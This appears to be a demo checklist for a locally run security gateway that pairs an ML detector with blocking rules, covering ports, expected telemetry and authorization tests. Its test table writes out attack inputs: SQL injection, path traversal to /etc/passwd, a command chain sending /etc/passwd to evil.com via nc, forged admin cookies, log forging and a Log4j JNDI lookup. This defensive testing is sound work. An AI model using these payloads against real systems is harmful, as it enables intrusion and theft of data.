# Demo checklist

Use this list to start the review stack and show the measured behavior. Every attack request goes to `http://127.0.0.1:8081`. Do not send attack traffic, a ZAP scan, or the catalog to production port 8080. Do not replace files under `models/atrdf` or `models/bola`. Do not open `REQUEST_ONLY_test.csv`.

The seeded password for user01 through user05 is stored in `demo_api/server.js`. Read it there when a login is required. Do not copy it into slides, screenshots, or this checklist. Do not copy JWTs into the report.

## 1. Confirm what is already listening

On the machine used for the final verification:

| Port | Role | Must stay |
|---|---|---|
| 4173 | Built catalog, `vite preview` | Review UI |
| 8081 | Review gateway, profile `experimental-payload` | Attack target |
| 8000 | ML service | Inference |
| 5001 | Demo API | Authorization and catalog data |
| 8091 | OWASP ZAP 2.17.0 | Proxy and sender |
| 8080 | Production gateway | Do not restart and do not scan |

`GET http://127.0.0.1:8091/JSON/core/view/version/` should return 2.17.0. `GET http://127.0.0.1:8081/health` should return HTTP 200. The health JSON may still display `"port": 8080` even when the process is bound to 8081. Confirm the listener with the process command line, which must include `--server.port=8081` and `--gateway.atrdf.profile=experimental-payload`.

To run Sequential Pattern Reinforcement instead of the payload forest, start the ML service as usual (it loads `models/spr/atrdf_spr.joblib` and `bola_spr.joblib`) and launch the review gateway with `--gateway.atrdf.profile=pattern-reinforcement`. Telemetry model names are `atrdf_spr` / `bola_spr`. A header `X-Ground-Truth` with the family name (or `BOLA`) updates the live prototype memory through `POST /feedback`. Production `models/atrdf` and `models/bola` stay unchanged. Retrain with `py -3 ml_service/train_live_spr.py`.

## 2. Start only a missing review service

From `frontend/`, with `frontend/.env.local` containing `VITE_GATEWAY_URL=http://127.0.0.1:8081`:

```text
npm run build
npx vite preview --host 127.0.0.1 --port 4173 --strictPort
```

The built JavaScript must contain `127.0.0.1:8081`. If a build is made without that environment variable, Vite falls back to port 8080. Do not use that build for the demo.

Review gateway, only if 8081 is down:

```text
java -jar %TEMP%\gateway-review-six\security-gateway-1.0.0.jar --server.port=8081 --gateway.atrdf.profile=experimental-payload
```

Demo API, from `demo_api/`: `node server.js`. ML service, from `ml_service/`, using `.venv-repair\Scripts\python.exe` and the existing uvicorn application on port 8000. ZAP is the installed 2.17.0 daemon on `127.0.0.1:8091`. Do not enable OAST.

## 3. Normal catalog

Open `http://127.0.0.1:4173/`.

- The subtitle does not name a port.
- There is no Security Lab button and no payload panel.
- The seeded titles include Foundations of Network Protocol Security and Applied Machine Learning in Anomaly Detection.
- Choose category Technology. Four technology books remain.
- Search for `Anomaly`. One book remains. View Details shows owner user02.
- Search for `sleep` through the gateway, not as a command. It is a benign word and should be allowed.
- Edit is shown only for books owned by the selected user. Do not edit seeded books 101 or 201.

In `GET http://127.0.0.1:8081/api/telemetry/events?limit=20`, the catalog rows are `CASE-WEB`, decision ALLOW, class BENIGN, rule outcome NONE, `backendReached` true. The response header `X-Request-Id` is the same id.

## 4. Six ATRDF demonstrations

Send each request with ZAP `core/action/sendRequest` to `http://127.0.0.1:8081`. Set `X-Experiment-Id` and `X-Test-Case-Id`. Do not follow redirects. Read the gateway row for that `X-Request-Id`.

Expected model name: `candidate_binary_rf_six_heldout`. Expected `backendReached`: false. A matching review rule must be recorded. The forest uses 10 request features only, so LOG4J may be `mlDecision` ALLOW while `ATRDF-JNDI-LOOKUP` still blocks. Other families may be a model block, a rule block, or both. The HTTP status is the gateway block. Do not treat a rule-only block as a model detection.

| Case | Request | Class | Rule | HTTP |
|---|---|---|---|---|
| SQLI_001 | `GET /api/books?search=' OR '1'='1 -- UNION SELECT *` | SQL Injection | `ATRDF-SQL-STRUCTURE` | 403 |
| TRAVERSAL_001 | `GET /api/books/..%2F..%2F..%2Fetc%2Fpasswd` | Directory Traversal | `ATRDF-PATH-TRAVERSAL` | 403 |
| RCE_001 | `GET /api/books` with the saved query text `; cat /etc/passwd \| nc evil.com 4444` | RCE | `ATRDF-COMMAND-CHAIN` | 403 |
| COOKIE_001 | `GET /api/books` with cookie `admin=true; role=superadmin` | Cookie Injection | `ATRDF-COOKIE-AUTHORITY` | 401 |
| LOGFORGE_001 | `POST /api/comments/book/101` with text containing `\r\n` and `[CRITICAL]` | Log Forging | `ATRDF-LOG-LINE` | 403 |
| LOG4J_001 | `POST /api/comments/book/101` with `${jndi:ldap://test-research-domain.invalid:1389/Exploit}` | LOG4J | `ATRDF-JNDI-LOOKUP` | 403 |

The RCE value is text. It must not be executed, and it must not open a connection. The LOG4J host is the reserved `.invalid` name. Do not use a live callback host.

Cookie Injection HTTP 401 is the gateway body `Invalid session state. Reauthentication required.` `backendReached` is false. That is different from a demo API 401, whose body is `Authentication required. Please log in.` and whose `backendReached` is true. Cookie Injection also expires `session` and `JSESSIONID` (`Set-Cookie` Max-Age=0). The original mitigation string (`BLOCK + session validation`, `BLOCK + parameterized query path`, and the rest) is unchanged. Header `X-Mitigation-Techniques` lists the executed actions (`hard_block`, `invalidate_session_cookie`, `no_sql_execution`, `redact_control_characters`, `content_security_policy`, `defer_to_backend`). After eight hard blocks from the same source within two minutes the gateway returns HTTP 429 `MITIGATION-RATE-LIMIT` with `Retry-After`. ALLOW, BLOCK, BOLA ALERT + backend authorization, review regex rules, and fail-safe ALERT stay in place.

After the two comment posts, `GET /api/comments/book/101` still has count 1. Those posts must not be stored.

Do not send XSS as a counted detection. If the saved script comment is sent, the model label is RCE because of `markup_script`, and rule `ATRDF-MARKUP-SCRIPT` matches. That result is outside the six-family score.

If a later probe is model ALLOW, class BENIGN, and a rule id is the mitigation, report a rule block. Do not call it a model detection.

## 5. BOLA demonstrations

Log in as user01 and user02 through `POST /api/auth/login` on port 8081. The login request itself has no prior JWT, so its telemetry user is `unknown`.

| Case | Request | What to expect |
|---|---|---|
| Owner | user01 `GET /api/books/101?view=manage` | ML BLOCK, family BOLA, gateway ALERT, mitigation `ALERT + backend authorization`, backend true, HTTP 200, title returned |
| Cross-owner | user02, same URL | Same ML block and ALERT, backend `BOLA_AUTHORIZATION_DENIED`, HTTP 403, no book fields |
| Unauthenticated | same URL with no token | ALERT, backend reached, HTTP 401 `Authentication required. Please log in.` |
| Public read | `GET /api/books/101` with no token | ML may be BLOCK BOLA, gateway `ALERT + public catalog read`, HTTP 200. This is not a BOLA vulnerability |

Do not change book 101 or book 201. For an edit or delete denial, create a disposable book as user01, attempt the change as user02, confirm `BOLA_PERMISSION_DENIED`, then delete the disposable book as user01.

The BOLA probability moves with the session window. The pass condition is the HTTP result and `backendReached` true, not a fixed probability.

## 6. Benign suite

Replay the 35 GET cases in `DeploymentShiftAtrdfSuiteTest` against port 8081. Header profiles H2 through H6 add User-Agent, then Accept, Accept-Language, Accept-Encoding, and Connection, in that order. Host is the live host `127.0.0.1:8081`. Do not run the JUnit class itself. That class writes `research/atrdf_header_count_ablation/controlled_suite_features.json`.

Each case should be HTTP 200, decision ALLOW, class BENIGN, malicious probability 0.0, rule NONE, `backendReached` true. The final recorded run was REQ-1011 through REQ-1045, 35/35, on experiment `EXP-ZAP-PREVIEW`.

Also confirm `category=Technology`, `search=sleep`, and `search=protocol&ref=a+b;c` stay ALLOW.

## 7. Where each result is visible

| Question | Where |
|---|---|
| ZAP message id | `sendRequest` response field `id` |
| Gateway request id | Response header `X-Request-Id` and telemetry `requestId` |
| ML decision and class | `X-Ml-Decision`, telemetry `mlDecision`, `predictedClass` |
| Probability | telemetry `binaryProbabilities` or `probabilities` |
| Rule | `X-Rule-Id`, `X-Rule-Outcome` |
| Gateway decision | `X-Security-Decision`, telemetry `decision` |
| Backend reached | telemetry `backendReached` |
| Authorization body | HTTP body codes `BOLA_AUTHORIZATION_DENIED` or `BOLA_PERMISSION_DENIED` |

## 8. Stop conditions

Stop if a request is about to leave `127.0.0.1`, if ZAP offers an OAST callback, or if a scan policy can send PUT or DELETE to seeded books. The manifest `zap/manifests/live_experiment.yaml` targets port 8080 and must not be run as written.
